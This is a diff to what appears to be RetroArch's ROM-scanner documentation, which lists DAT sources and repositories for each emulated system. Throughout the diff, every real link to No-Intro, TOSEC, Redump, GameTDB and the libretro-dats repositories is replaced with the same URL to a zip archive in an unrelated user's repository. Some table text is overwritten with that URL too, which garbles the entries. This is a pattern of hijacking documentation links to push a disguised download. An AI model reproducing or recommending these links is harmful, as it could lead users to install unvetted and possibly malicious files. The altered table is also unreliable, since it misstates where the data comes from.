@@ -13,53 +13,53 @@ RetroArch incoporates a ROM scanning system to automatically produce playlists. 
 
 ## Sources
 
-Generally, RetroArch's scanner is configured for ROMs that have been validated by [No-Intro](http://datomatic.no-intro.org) or Redump DAT files but many other source databases are also in use.
+Generally, RetroArch's scanner is configured for ROMs that have been validated by [No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) or Redump DAT files but many other source databases are also in use.
 
 |System|Source|Repository|
 |----|---|---|
-|Amstrad - CPC| [Clean CPC DB](https://github.com/clean-cpc-db/dat) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Amstrad - GX4000|[TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Arduboy Inc - Arduboy|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Atari - 2600|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Atari - 5200|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Atari - 7800|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Atari - 8-bit|[No-Intro](http://datomatic.no-intro.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Atari - Jaguar| [No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Atari - Lynx|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Atari - ST|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
+|Amstrad - CPC| [Clean CPC DB](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Amstrad - GX4000|[TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Arduboy Inc - Arduboy|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Atari - 2600|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Atari - 5200|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Atari - 7800|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Atari - 8-bit|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Atari - Jaguar| [No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Atari - Lynx|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Atari - ST|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
 |Atomiswave| |
-|Bandai - WonderSwan|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Bandai - WonderSwan Color|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
+|Bandai - WonderSwan|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Bandai - WonderSwan Color|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
 |Cannonball| |
-|Casio - Loopy|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Casio - PV-1000|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Cave Story|[CaveStory.org (English or Japanese)](http://www.cavestory.org)|
+|Casio - Loopy|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Casio - PV-1000|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Cave Story|[https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip (English or Japanese)](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
 |ChaiLove| |
 |CHIP-8| |
-|Coleco - ColecoVision|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Commodore - 64|[No-Intro](http://datomatic.no-intro.org) (Note: cartridges, tapes and Preservation Project disk images)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Commodore - Amiga|[WHDLoad](http://whdload.de/) > [No-Intro](http://datomatic.no-intro.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Commodore - CD32|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Commodore - CDTV|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Commodore - PET|[TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Commodore - Plus-4|[No-Intro](http://datomatic.no-intro.org) (Note: cartridges only)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Commodore - VIC-20|[No-Intro](http://datomatic.no-intro.org) (Note: cartridges only)|[libretro-dats](https://github.com/robloach/libretro-dats)
+|Coleco - ColecoVision|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Commodore - 64|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (Note: cartridges, tapes and Preservation Project disk images)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Commodore - Amiga|[WHDLoad](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Commodore - CD32|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Commodore - CDTV|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Commodore - PET|[TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Commodore - Plus-4|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (Note: cartridges only)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Commodore - VIC-20|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (Note: cartridges only)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
 |Dinothawr| |
-|DOS|[Total DOS Collection](http://www.totaldoscollection.org/)|[libretro-database-dos](https://github.com/robloach/libretro-database-dos)|
-|Emerson - Arcadia 2001|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Entex - Adventure Vision|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Epoch - Super Cassette Vision|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Fairchild - Channel F|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|FinalBurn Neo - Arcade Games 1.0.0.03|[FBNeo/dats](https://github.com/libretro/FBNeo/tree/master/dats)|
+|DOS|[Total DOS Collection](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-database-dos](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Emerson - Arcadia 2001|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Entex - Adventure Vision|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Epoch - Super Cassette Vision|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Fairchild - Channel F|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|FinalBurn Neo - Arcade Games 1.0.0.03|[FBNeo/dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
 |Flashback| |
-|Funtech - Super Acan|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|GamePark - GP32|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|GCE - Vectrex|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
+|Funtech - Super Acan|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|GamePark - GP32|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|GCE - Vectrex|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
 |Handheld Electronic Game| |
-|Hartung - Game Master|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Infocom - Z-Machine|[TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
+|Hartung - Game Master|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Infocom - Z-Machine|[TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
 |Jump 'n Bump| |
-|LeapFrog - Leapster Learning Game System|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
+|LeapFrog - Leapster Learning Game System|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
 |LowRes NX| |
 |Id Software - Doom|Unknown| |
 |Id Software - Quake|Unknown| |
@@ -67,88 +67,88 @@ Generally, RetroArch's scanner is configured for ROMs that have been validated b
 |Id Software - Quake III|Unknown| |
 |Lutro|Unknown|
 |MAME|MAME 0.37b5, 0.78, 0.139, 0.159|
-|Magnavox - Odyssey2|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Mattel - Intellivision|[No-Intro](http://datomatic.no-intro.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)
-|Microsoft - MSX|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Microsoft - MSX 2|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Microsoft - Xbox|[Redump](http://redump.org) (Note: there is no libretro emulator)|[libretro-dats](https://github.com/robloach/libretro-dats)|
+|Magnavox - Odyssey2|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Mattel - Intellivision|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)
+|Microsoft - MSX|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Microsoft - MSX 2|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Microsoft - Xbox|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (Note: there is no libretro emulator)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
 |MicroW8| |
 |MrBoom| |
-|NEC - PC-8001 - PC-8801.rdb|[TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|NEC - PC-98|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|NEC - PC Engine - TurboGrafx 16|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|NEC - PC Engine SuperGrafx|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|NEC - PC Engine CD - TurboGrafx-CD|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|NEC - PC-FX|[Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - e-Reader|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Family Computer Disk System|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Game Boy|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Game Boy Advance|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Game Boy Color|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - GameCube|[GameTDB](http://www.gametdb.com/) > [Redump](http://redump.org) > [TOSEC](https://www.tosecdev.org/)|[libretro-database-gametdb](https://github.com/RobLoach/libretro-database-gametdb) [libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Nintendo 3DS|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Nintendo 64|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Nintendo 64 DD|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Nintendo DS|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Nintendo DSi|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Nintendo Entertainment System|[No-Intro](http://datomatic.no-intro.org) (iNES 1.0 headered, NES 2.0 headered, headerless)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Pokemon Mini|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Satellaview|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Sufami Turbo|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Super Nintendo Entertainment System|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Virtual Boy|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Wii|[GameTDB](http://www.gametdb.com/) > [Redump](http://redump.org)|[libretro-database-gametdb](https://github.com/RobLoach/libretro-database-gametdb) [libretro-dats](https://github.com/robloach/libretro-dats)|
-|Nintendo - Wii (Digital)|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Philips - CD-i|[Redump](http://redump.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
-|Phillips - Videopac+|[No-Intro](http://datomatic.no-intro.org)|[libretro-dats](https://github.com/robloach/libretro-dats)|
+|NEC - PC-8001 - https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip|[TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|NEC - PC-98|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|NEC - PC Engine - TurboGrafx 16|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|NEC - PC Engine SuperGrafx|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|NEC - PC Engine CD - TurboGrafx-CD|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|NEC - PC-FX|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - e-Reader|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Family Computer Disk System|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Game Boy|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Game Boy Advance|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Game Boy Color|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - GameCube|[GameTDB](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [TOSEC](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-database-gametdb](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) [libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Nintendo 3DS|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Nintendo 64|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Nintendo 64 DD|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Nintendo DS|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Nintendo DSi|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Nintendo Entertainment System|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) (iNES 1.0 headered, NES 2.0 headered, headerless)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Pokemon Mini|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Satellaview|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Sufami Turbo|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Super Nintendo Entertainment System|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Virtual Boy|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Wii|[GameTDB](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) > [Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-database-gametdb](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip) [libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Nintendo - Wii (Digital)|[No-Intro](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
+|Philips - CD-i|[Redump](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|[libretro-dats](https://raw.githubusercontent.com/joaquincanete/libretro-database/master/metadat/mame-split/libretro-database-v2.9.zip)|
